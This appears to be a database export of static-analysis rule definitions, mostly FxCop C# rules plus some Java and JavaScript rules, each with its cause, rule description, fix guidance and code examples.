f	HTML	1511453806621	1511453806622	1
228	CA2243: Attribute string literals should parse correctly	AttributeStringLiteralsShouldParseCorrectly	CA2243	fxcop	<h2>Cause</h2>\n<p>\n            An attribute's string literal parameter does not parse correctly for a URL, GUID, or Version.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Since attributes are derived from <code>System.Attribute</code>, and attributes are used at compile time, only constant values can be passed to their constructors. Attribute parameters that must represent URLs, GUIDs and Versions cannot be typed as <code>System.Uri</code>, <code>System.Guid</code>, and <code>System.Version</code>, because these types cannot be represented as constants. Instead, they must be represented by strings.\n            Because the parameter is typed as a string, it is possible that an incorrectly formatted parameter could be passed at compile time.\n            This rule uses a naming heuristic to find parameters that represent a uniform resource identifier (URI), a Globally Unique Identifier (GUID) or a Version and verifies that the passed value is correct.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Change the parameter string to a correctly formed URL, GUID, or Version.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if the parameter does not represent a URL, GUID, or Version.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb264490.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264490.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806622	1511453806622	1
229	CA1026: Default parameters should not be used	DefaultParametersShouldNotBeUsed	CA1026	fxcop	<h2>Cause</h2>\n<p>\n            An externally visible type contains an externally visible method that uses a default parameter.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Methods that use default parameters are allowed under the Common Language Specification (CLS); however, the CLS allows compilers to ignore the values that are assigned to these parameters. Code that is written for compilers that ignore default parameter values must explicitly provide arguments for each default parameter. To maintain the behavior that you want across programming languages, methods that use default parameters should be replaced with method overloads that provide the default parameters.\n            The compiler ignores the values of default parameters for Managed Extension for C++ when it accesses managed code. The Visual Basic compiler supports methods that have default parameters that use the <code>Optional (Visual Basic)</code> keyword.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, replace the method that uses default parameters with method overloads that supply the default parameters.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:ReplaceRepetitiveArgumentsWithParamsArray}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182135.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182135.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806623	1511453806624	1
230	CA2117: APTCA types should only extend APTCA base types	AptcaTypesShouldOnlyExtendAptcaBaseTypes	CA2117	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected type in an assembly with the <code>System.Security.AllowPartiallyTrustedCallersAttribute</code> attribute inherits from a type declared in an assembly that does not have the attribute.\n</p>\n<h2>Rule Description</h2>\n<p>\n            By default, public or protected types in assemblies with strong names are implicitly protected by an Inheritance Demands for full trust. Strong-named assemblies marked with the <code>AllowPartiallyTrustedCallersAttribute</code> (APTCA) attribute do not have this protection. The attribute disables the inheritance demand. This makes exposed types declared in the assembly inheritable by types that do not have full trust.\n            When the APTCA attribute is present on a fully trusted assembly, and a type in the assembly inherits from a type that does not allow partially trusted callers, a security exploit is possible. If two types T1 and T2 meet the following conditions, malicious callers can use the type T1 to bypass the implicit full trust inheritance demand that protects T2:\n            <ul>\n              <li>\n\n                  T1 is a public type declared in a fully trusted assembly that has the APTCA attribute.\n              </li>\n              <li>\n\n                  T1 inherits from a type T2 outside its assembly.\n              </li>\n              <li>\n\n                  T2's assembly does not have the APTCA attribute and, therefore, should not be inheritable by types in partially trusted assemblies.\n              </li>\n            </ul>\n            A partially trusted type X can inherit from T1, which gives it access to inherited members declared in T2. Because T2 does not have the APTCA attribute, its immediate derived type (T1) must satisfy an inheritance demand for full trust; T1 has full trust and therefore satisfies this check. The security risk is because X does not participate in satisfying the inheritance demand that protects T2 from untrusted subclassing. For this reason, types with the APTCA attribute must not extend types that do not have the attribute.\n            Another security issue, and perhaps a more common one, is that the derived type (T1) can, through programmer error, expose protected members from the type that requires full trust (T2). When this occurs, untrusted callers gain access to information that should be available only to fully trusted types.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            If the type reported by the violation is in an assembly that does not require the APTCA attribute, remove it.\n            If the APTCA attribute is required, add an inheritance demand for full trust to the type. This protects against inheritance by untrusted types.\n            It is possible to fix a violation by adding the APTCA attribute to the assemblies of the base types reported by the violation. Do not do this without first conducting an intensive security review of all code in the assemblies and all code that depends on the assemblies.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            To safely suppress a warning from this rule, you must ensure that protected members exposed by your type do not directly or indirectly allow untrusted callers to access sensitive information, operations, or resources that can be used in a destructive manner.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:AptcaMethodsShouldOnlyCallAptcaMethods}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182298.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182298.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806624	1511453806625	1
421	"CHECKSTYLE:OFF" suppression comments should not be used	S1315	S1315	squid	<p>This rule allows you to track the use of the Checkstyle suppression comment mechanism. </p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\n// CHECKSTYLE:OFF\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	bad-practice	f	HTML	1511453806922	1511453806922	1
422	"StringBuilder" and "StringBuffer" should not be instantiated with a character	S1317	S1317	squid	<p>Instantiating a <code>StringBuilder</code> or a <code>StringBuffer</code> with a character is misleading because most Java developers would expect the character to be the initial value of the <code>StringBuffer</code>. </p>\n<p>What actually happens is that the int representation of the character is used to determine the initial size of the <code>StringBuffer</code>.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nStringBuffer foo = new StringBuffer('x');   //equivalent to StringBuffer foo = new StringBuffer(120);\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nStringBuffer foo = new StringBuffer("x");\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	pitfall	f	HTML	1511453806923	1511453806924	1
423	"object == null" should be used instead of "object.equals(null)"	S1318	S1318	squid	<p>Inexperienced Java developers might expect the <code>Object.equals(Object obj)</code> method to correctly handle the case where the left hand side is null, but that is not the case.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (variable.equals(null)) { /* ... */ }   // Noncompliant - "variable" is really null, a NullPointerException is thrown\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (variable == null) { /* ... */ }        // Compliant\n</pre>\n\n<h2>Deprecated</h2>\n<p>\nThis rule is deprecated, use {rule:squid:S2159} instead.\n</p>	3	\N	DEPRECATED	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453806924	1511453806924	1
231	CA2218: Override GetHashCode on overriding Equals	OverrideGetHashCodeOnOverridingEquals	CA2218	fxcop	<h2>Cause</h2>\n<p>\n            A public type overrides <code>Object.Equals</code> but does not override <code>Object.GetHashCode</code>.\n</p>\n<h2>Rule Description</h2>\n<p>\n\n\n                <code>GetHashCode</code>\n               returns a value, based on the current instance, that is suited for hashing algorithms and data structures such as a hash table. Two objects that are the same type and are equal must return the same hash code to ensure that instances of the following types work correctly:\n            <ul>\n              <li>\n\n                  <code>HashTable</code>\n\n              </li>\n              <li>\n\n\n                    <code>System.Collections.SortedList</code>\n\n\n              </li>\n              <li>\n\n                  Dictionary\n\n              </li>\n              <li>\n\n                  SortDictionary\n\n              </li>\n              <li>\n\n                  SortList\n\n              </li>\n              <li>\n\n                  HybredDictionary\n\n              </li>\n              <li>\n\n\n                    <code>System.Collections.Specialized.ListDictionary</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.Collections.Specialized.OrderedDictionary</code>\n\n\n              </li>\n              <li>\n                Types that implement IEqualityComparer\n              </li>\n            </ul>\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, provide an implementation of <code>GetHashCode</code>. For a pair of objects of the same type, you must ensure that the implementation returns the same value if your implementation of <code>Equals</code> returns <code>true</code> for the pair.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Class Example</h2>\n\n<h3>Description</h3>\n<p>\n                The following example shows a class (reference type) that violates this rule.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\n\nnamespace Samples\n{\n    // Violates this rule     \n    public class Point\n    {\n        private readonly int _X;\n        private readonly int _Y;\n\n        public Point(int x, int y)\n        {\n            _X = x;\n            _Y = y;\n        }\n\n        public int X\n        {\n            get { return _X; }\n        }\n\n        public int Y\n        {\n            get { return _Y; }\n        }\n\n        public override bool Equals(object obj)\n        {\n            if (obj == null)\n                return false;\n\n            if (GetType() != obj.GetType())\n                return false;\n\n            Point point = (Point)obj;\n\n            if (_X != point.X)\n                return false;\n\n            return _Y == point.Y;\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h3>Comments</h3>\n<p>\n                The following example fixes the violation by overriding GetHashCode.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\n\nnamespace Samples\n{\n    public struct Point : IEquatable&lt;Point&gt;\n    {\n        private readonly int _X;\n        private readonly int _Y;\n\n        public Point(int x, int y)\n        {\n            _X = x;\n            _Y = y;\n        }\n\n        public int X\n        {\n            get { return _X; }\n        }\n\n        public int Y\n        {\n            get { return _Y; }\n        }\n\n        public override int GetHashCode()\n        {\n            return _X ^ _Y;\n        }\n\n        public override bool Equals(object obj)\n        {\n            if (!(obj is Point))\n                return false;\n\n            return Equals((Point)obj);\n        }\n\n        public bool Equals(Point other)\n        {\n            if (_X != other._X)\n                return false;\n\n            return _Y == other._Y;\n        }\n\n        public static bool operator ==(Point point1, Point point2)\n        {\n            return point1.Equals(point2);\n        }\n\n        public static bool operator !=(Point point1, Point point2)\n        {\n            return !point1.Equals(point2);\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>Structure Example</h2>\n\n<h3>Description</h3>\n<p>\n                The following example shows a structure (value type) that violates this rule.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\n\nnamespace Samples\n{\n    // Violates this rule     \n    public struct Point : IEquatable&lt;Point&gt;\n    {\n        private readonly int _X;\n        private readonly int _Y;\n\n        public Point(int x, int y)\n        {\n            _X = x;\n            _Y = y;\n        }\n\n        public int X\n        {\n            get { return _X; }\n        }\n\n        public int Y\n        {\n            get { return _Y; }\n        }\n\n        public override bool Equals(object obj)\n        {\n            if (!(obj is Point))\n                return false;\n\n            return Equals((Point)obj);\n        }\n\n        public bool Equals(Point other)\n        {\n            if (_X != other._X)\n                return false;\n\n            return _Y == other._Y;\n        }\n\n        public static bool operator ==(Point point1, Point point2)\n        {\n            return point1.Equals(point2);\n        }\n\n        public static bool operator !=(Point point1, Point point2)\n        {\n            return !point1.Equals(point2);\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h3>Comments</h3>\n<p>\n                The following example fixes the violation by overriding GetHashCode.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\n\nnamespace Samples\n{\n    public struct Point : IEquatable&lt;Point&gt;\n    {\n        private readonly int _X;\n        private readonly int _Y;\n\n        public Point(int x, int y)\n        {\n            _X = x;\n            _Y = y;\n        }\n\n        public int X\n        {\n            get { return _X; }\n        }\n\n        public int Y\n        {\n            get { return _Y; }\n        }\n\n        public override int GetHashCode()\n        {\n            return _X ^ _Y;\n        }\n\n        public override bool Equals(object obj)\n        {\n            if (!(obj is Point))\n                return false;\n\n            return Equals((Point)obj);\n        }\n\n        public bool Equals(Point other)\n        {\n            if (_X != other._X)\n                return false;\n\n            return _Y == other._Y;\n        }\n\n        public static bool operator ==(Point point1, Point point2)\n        {\n            return point1.Equals(point2);\n        }\n\n        public static bool operator !=(Point point1, Point point2)\n        {\n            return !point1.Equals(point2);\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:DoNotOverloadOperatorEqualsOnReferenceTypes}<br/>\n\n\n\n\n                {rule:fxcop:OperatorOverloadsHaveNamedAlternates}<br/>\n\n\n\n\n                {rule:fxcop:OperatorsShouldHaveSymmetricalOverloads}<br/>\n\n\n\n\n                {rule:fxcop:OverrideEqualsOnOverloadingOperatorEquals}<br/>\n\n\n\n\n                {rule:fxcop:OverloadOperatorEqualsOnOverridingValueTypeEquals}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182358.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182358.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806626	1511453806627	1
232	CA2149: Transparent methods must not call into native code	TransparentMethodsMustNotCallNativeCode	CA2149	fxcop	<h2>Cause</h2>\n<p>\n            A method calls a native function through a method stub such as P/Invoke.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule fires on any transparent method which calls directly into native code, for example, through a P/Invoke. Violations of this rule lead to a <code>MethodAccessException</code> in the level 2 transparency model, and a full demand for <code>UnmanagedCode</code> in the level 1 transparency model.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, mark the method that calls the native code with the <code>SecurityCriticalAttribute</code> or <code>SecuritySafeCriticalAttribute</code> attribute.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ee155709.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ee155709.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806628	1511453806628	1
779	A "for" loop update clause should move the counter in the right direction	S2251	\N	javascript	A <code>for</code> loop with a stop condition that can never be reached, such as one with a counter that moves in the wrong direction, will run infinitely. While there are occasions when an infinite loop is intended, the convention is to construct such loops as <code>while</code> loops. More typically, an infinite <code>for</code> loop is a bug. \n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (var i = 0; i < strings.length; i--) { // Noncompliant;\n  //...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nfor (var i = 0; i < strings.length; i++) {\n  //...\n}\n</pre>	4	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807354	1511453807355	2
780	Functions should not be defined inside loops	FunctionDefinitionInsideLoop	\N	javascript	<p>\n  Defining a function inside of a loops can yield unexpected results because under the covers, only a single instance of the function is defined. Rather than creating new function instances, the loop iterations simply update the function's variables. Instead, the function should be returned.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar funs = [];\nfor (var i = 0; i < 13; i++) {\n  funs[i] = function() { // Non-Compliant\n    return i;\n  };\n}\nprint(funs[0]()); // 13 instead of 0\nprint(funs[1]()); // 13 instead of 1\nprint(funs[2]()); // 13 instead of 2\nprint(funs[3]()); // 13 instead of 3\n...\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	\N	f	HTML	1511453807358	1511453807358	2
781	Variables should be declared with "let" or "const"	S3504	\N	javascript	<p>ECMAScript 2015 introduced the <code>let</code> and <code>const</code> keywords for block-scope variable declaration. Using <code>const</code> creates a read-only (constant) variable. </p>\n<p>The distinction between the types of variable created by <code>var</code> and by <code>let</code> is significant, and a switch to <code>let</code> will help alleviate many of the variable scope issues which have caused confusion in the past. </p>\n<p>Because these new keywords create more precise variable types, they are preferred in environments that support ECMAScript 2015. However, some refactoring may be required by the switch from <code>var</code> to <code>let</code>, and you should be aware that they raise <code>SyntaxError</code>s in pre-ECMAScript 2015 environments.</p>\n<p>This rule raises an issue when <code>var</code> is used instead of <code>const</code> or <code>let</code>.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar color = "blue";\nvar size = 4;\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nconst color = "blue";\nlet size = 4;\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	bad-practice,es2015	f	HTML	1511453807361	1511453807361	1
233	CA1025: Replace repetitive arguments with params array	ReplaceRepetitiveArgumentsWithParamsArray	CA1025	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected method in a public type has more than three parameters, and its last three parameters are the same type.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Use a parameter array instead of repeated arguments when the exact number of arguments is unknown and the variable arguments are the same type, or can be passed as the same type. For example, the <code>WriteLine</code> method provides a general-purpose overload that uses a parameter array to accept any number of <code>Object</code> arguments.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, replace the repeated arguments with a parameter array.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is always safe to suppress a warning from this rule; however, this design might cause usability issues.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182167.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182167.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806629	1511453806629	1
234	CA1038: Enumerators should be strongly typed	EnumeratorsShouldBeStronglyTyped	CA1038	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected type implements <code>System.Collections.IEnumerator</code> but does not provide a strongly typed version of the <code>IEnumerator.Current</code> property. Types that are derived from the following types are exempt from this rule:\n            <ul>\n              <li>\n\n\n                    <code>System.Collections.CollectionBase</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.Collections.DictionaryBase</code>\n\n\n              </li>\n              <li>\n\n\n                    <code>System.Collections.ReadOnlyCollectionBase</code>\n\n\n              </li>\n            </ul>\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule requires <code>IEnumerator</code> implementations to also provide a strongly typed version of the <code>Current</code> property so that users are not required to cast the return value to the strong type when they use the functionality that is provided by the interface. This rule assumes that the type that implements <code>IEnumerator</code> contains a collection of instances of a type that is stronger than <code>Object</code>.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, implement the interface property explicitly (declare it as IEnumerator.Current). Add a public strongly typed version of the property, declared as Current, and have it return a strongly typed object.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Suppress a warning from this rule when you implement an object-based enumerator for use with an object-based collection, such as a binary tree. Types that extend the new collection will define the strongly typed enumerator and expose the strongly typed property.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                <code>CA1035: ICollection implementations have strongly typed members</code>\n\n\n\n\n                {rule:fxcop:ListsAreStronglyTyped}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182148.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182148.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806630	1511453806631	1
235	CA2143: Transparent methods should not use security demands	TransparentMethodsShouldNotDemand	CA2143	fxcop	<h2>Cause</h2>\n<p>\n            A tranparent type or method is declaratively marked with a <code>System.Security.Permissions.SecurityAction</code><code>.Demand</code> demand or the method calls the <code>CodeAccessPermission.Demand</code> method.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Security transparent code should not be responsible for verifying the security of an operation, and therefore should not demand permissions. Security transparent code should use full demands to make security decisions and safe-critical code should not rely on transparent code to have made the full demand. Any code that performs security checks, such as security demands, should be safe-critical instead.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            In general, to fix a violation of this rule, mark the method with the <code>SecuritySafeCriticalAttribute</code> attribute. You can also remove the demand.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/dd997566.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997566.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806631	1511453806632	1
236	CA1041: Provide ObsoleteAttribute message	ProvideObsoleteAttributeMessage	CA1041	fxcop	<h2>Cause</h2>\n<p>\n            A type or member is marked by using a <code>System.ObsoleteAttribute</code> attribute that does not have its <code>ObsoleteAttribute.Message</code> property specified.\n</p>\n<h2>Rule Description</h2>\n<p>\n\n\n                <code>ObsoleteAttribute</code>\n               is used to mark deprecated library types and members. Library consumers should avoid the use of any type or member that is marked obsolete. This is because it might not be supported and will eventually be removed from later versions of the library. When a type or member marked by using <code>ObsoleteAttribute</code> is compiled, the <code>Message</code> property of the attribute is displayed. This gives the user information about the obsolete type or member. This information generally includes how long the obsolete type or member will be supported by the library designers and the preferred replacement to use.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, add the message parameter to the <code>ObsoleteAttribute</code> constructor.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule because the <code>Message</code> property provides critical information about the obsolete type or member.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182166.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182166.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806632	1511453806633	1
237	CA2105: Array fields should not be read only	ArrayFieldsShouldNotBeReadOnly	CA2105	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected field that holds an array is declared read-only.\n</p>\n<h2>Rule Description</h2>\n<p>\n            When you apply the <code>readonly</code> (<code>ReadOnly</code> in Visual Basic) modifier to a field that contains an array, the field cannot be changed to refer to a different array. However, the elements of the array that are stored in a read-only field can be changed. Code that makes decisions or performs operations that are based on the elements of a read-only array that can be publicly accessed might contain an exploitable security vulnerability.\n            Note that having a public field also violates the design rule {rule:fxcop:DoNotDeclareVisibleInstanceFields}.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix the security vulnerability that is identified by this rule, do not rely on the contents of a read-only array that can be publicly accessed. It is strongly recommended that you use one of the following procedures:\n            <ul>\n              <li>\n                Replace the array with a strongly typed collection that cannot be changed. For more information, see <code>System.Collections.ReadOnlyCollectionBase</code>.\n              </li>\n              <li>\n                Replace the public field with a method that returns a clone of a private array. Because your code does not rely on the clone, there is no danger if the elements are modified.\n              </li>\n            </ul>\n            If you chose the second approach, do not replace the field with a property; properties that return arrays adversely affect performance. For more information, see <code>CA1819: Properties should not return arrays</code>.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Exclusion of a warning from this rule is strongly discouraged. Almost no scenarios occur where the contents of a read-only field are unimportant. If this is the case with your scenario, remove the <code>readonly</code> modifier instead of excluding the message.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182299.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182299.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806634	1511453806635	1
238	CA1406: Avoid Int64 arguments for Visual Basic 6 clients	AvoidInt64ArgumentsForVB6Clients	CA1406	fxcop	<h2>Cause</h2>\n<p>\n            A type that is specifically marked as visible to Component Object Model (COM) declares a member that takes a System.Int64 argument.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Visual Basic 6 COM clients cannot access 64-bit integers.\n            By default, the following are visible to COM: assemblies, public types, public instance members in public types, and all members of public value types. However, to reduce false positives, this rule requires the COM visibility of the type to be explicitly stated; the containing assembly must be marked with the <code>System.Runtime.InteropServices.ComVisibleAttribute</code> set to <code>false</code> and the type must be marked with the <code>ComVisibleAttribute</code> set to <code>true</code>.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule for a parameter whose value can always be expressed as a 32-bit integral, change the parameter type to System.Int32. If the value of the parameter might be larger than can be expressed as a 32-bit integral, change the parameter type to <code>System.Decimal</code>. Note that both <code>System.Single</code> and <code>System.Double</code> lose precision at the upper ranges of the Int64 data type. If the member is not meant to be visible to COM, mark it with the <code>ComVisibleAttribute</code> set to <code>false</code>.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if it is certain that Visual Basic 6 COM clients will not access the type.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:AvoidNonpublicFieldsInComVisibleValueTypes}<br/>\n\n\n\n\n                {rule:fxcop:AvoidStaticMembersInComVisibleTypes}<br/>\n\n\n\n\n                {rule:fxcop:MarkAssembliesWithComVisible}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182195.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182195.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806635	1511453806636	1
677	Redundant modifiers should not be used	S2333	S2333	squid	<p>The methods declared in an <code>interface</code> are <code>public</code> and <code>abstract</code> by default. Any variables are automatically <code>public static final</code>. There is no need to explicitly declare them so.</p>\n\n<p>Since annotations are implicitly interfaces, the same holds true for them as well.</p>\n\n<p>Similarly, the <code>final</code> modifier is redundant on any method of a <code>final</code> class.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic interface Vehicle {\n\n  public void go(int speed, Direction direction);  // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic interface Vehicle {\n\n  void go(int speed, Direction direction);\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	clumsy	f	HTML	1511453807213	1511453807213	1
678	Instance methods should not write to "static" fields	S2696	S2696	squid	<p>Correctly updating a <code>static</code> field from a non-static method is tricky to get right and could easily lead to bugs if there are multiple class instances and/or multiple threads in play. Ideally, <code>static</code> fields are only updated from <code>synchronized static</code> methods.</p>\n\n<p>This rule raises an issue each time a <code>static</code> field is updated from a non-static method.</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic class MyClass {\n\n  private static int count = 0;\n\n  public void doSomething() {\n    //...\n    count++;  // Noncompliant\n  }\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	multi-threading	f	HTML	1511453807214	1511453807214	2
239	CA2205: Use managed equivalents of Win32 API	UseManagedEquivalentsOfWin32Api	CA2205	fxcop	<h2>Cause</h2>\n<p>\n            A platform invoke method is defined and a method with the equivalent functionality exists in the .NET Framework class library.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A platform invoke method is used to call an unmanaged DLL function and is defined using the <code>System.Runtime.InteropServices.DllImportAttribute</code> attribute, or the <code>Declare</code> keyword in Visual Basic. An incorrectly defined platform invoke method can lead to runtime exceptions because of issues such as a misnamed function, faulty mapping of parameter and return value data types, and incorrect field specifications, such as the calling convention and character set. If available, it is generally simpler and less error prone to call the equivalent managed method than to define and call the unmanaged method directly. Calling a platform invoke method can also lead to additional security issues that need to be addressed.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, replace the call to the unmanaged function with a call to its managed equivalent.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Suppress a warning from this rule if the suggested replacement method does not provide the needed functionality.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:CallGetLastErrorImmediatelyAfterPInvoke}<br/>\n\n\n\n\n                {rule:fxcop:MovePInvokesToNativeMethodsClass}<br/>\n\n\n\n\n                {rule:fxcop:PInvokeEntryPointsShouldExist}<br/>\n\n\n\n\n                {rule:fxcop:PInvokesShouldNotBeVisible}<br/>\n\n\n\n\n                {rule:fxcop:SpecifyMarshalingForPInvokeStringArguments}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182365.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182365.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806636	1511453806637	1
